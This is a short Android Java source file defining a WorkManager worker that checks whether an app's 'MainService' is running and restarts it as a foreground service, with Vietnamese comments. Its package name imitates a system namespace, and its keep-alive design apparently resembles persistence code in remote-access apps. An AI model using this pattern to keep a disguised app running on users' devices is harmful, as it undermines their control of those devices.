package com.android.background.services.helpers;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.background.services.MainService;

public class ServiceWorker extends Worker {

    public ServiceWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d("ServiceWorker", "WorkManager executing - checking service status");
        
        try {
            // Kiểm tra xem service có đang chạy không
            if (!isServiceRunning()) {
                Log.d("ServiceWorker", "Service not running, starting...");
                startService();
            } else {
                Log.d("ServiceWorker", "Service is running");
            }
            
            return Result.success();
        } catch (Exception e) {
            Log.e("ServiceWorker", "Error in ServiceWorker", e);
            return Result.retry();
        }
    }

    private boolean isServiceRunning() {
        // Kiểm tra xem service có đang chạy không
        // Có thể sử dụng ActivityManager để kiểm tra
        return MainService.getContextOfApplication() != null;
    }

    private void startService() {
        Intent serviceIntent = new Intent(getApplicationContext(), MainService.class);
        ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
    }
}
